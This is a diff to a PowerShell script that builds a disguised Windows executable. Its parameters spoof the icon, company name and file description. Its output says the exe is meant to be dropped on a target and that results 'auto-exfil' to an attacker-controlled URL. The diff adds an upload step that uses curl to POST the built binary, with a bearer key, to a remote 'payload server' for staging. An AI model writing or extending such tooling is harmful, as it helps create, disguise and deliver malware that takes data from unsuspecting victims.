@@ -22,7 +22,8 @@ param(
     [string]$ExeName   = "",
     [string]$IconFile  = "",    # path to .ico or .exe to extract icon from (auto-set by preset)
     [string]$Company   = "",    # CompanyName in Properties (auto-set by preset)
-    [string]$FileDesc  = ""     # FileDescription in Properties (auto-set by preset)
+    [string]$FileDesc  = "",    # FileDescription in Properties (auto-set by preset)
+    [switch]$Upload             # upload built exe to payload server after building
 )
 
 Set-StrictMode -Version Latest
@@ -317,3 +318,18 @@ Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue
 Write-Host ""
 Write-Host "[+] Done: $distDir\$ExeName.exe"
 Write-Host "    Drop and run - results auto-exfil to $ExfilUrl"
+
+# ── Upload ────────────────────────────────────────────────────────────────────
+if ($Upload) {
+    $outFile = Join-Path $distDir "$ExeName.exe"
+    Write-Host ""
+    Write-Host "[*] Uploading $ExeName.exe to $ExfilUrl/payloads ..."
+    $status = & curl.exe -s -o NUL -w "%{http_code}" -X POST "$ExfilUrl/payloads" `
+        -H "Authorization: Bearer $ExfilKey" `
+        -F "file=@$outFile;filename=$ExeName.exe"
+    if ($status -match "^[23]") {
+        Write-Host "[+] Uploaded: $ExfilUrl/payloads/$ExeName.exe"
+    } else {
+        Write-Host "[!] Upload failed (HTTP $status)"
+    }
+}
